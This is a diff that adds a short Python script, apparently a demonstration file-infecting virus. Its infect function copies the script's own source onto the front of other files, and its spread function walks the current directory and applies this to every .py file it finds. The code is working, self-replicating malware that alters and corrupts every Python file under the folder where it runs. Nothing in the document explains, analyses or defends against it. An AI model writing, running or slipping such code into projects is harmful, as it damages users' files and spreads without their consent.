@@ -1,0 +1,26 @@
+import os
+import sys
+
+def infect(file_path):
+    try:
+        with open(__file__, 'rb') as virus_file:
+            virus_code = virus_file.read()
+        
+        with open(file_path, 'rb') as target_file:
+            target_code = target_file.read()
+        
+        with open(file_path, 'wb') as infected_file:
+            infected_file.write(virus_code + b'\n\n' + target_code)
+        
+        print(f"Infected: {file_path}")
+    except Exception as e:
+        print(f"Error infecting {file_path}: {str(e)}")
+
+def spread():
+    for root, dirs, files in os.walk('.'):
+        for file in files:
+            if file.endswith('.py'):  # Only infect Python files for demonstration
+                infect(os.path.join(root, file))
+
+if __name__ == "__main__":
+    spread()
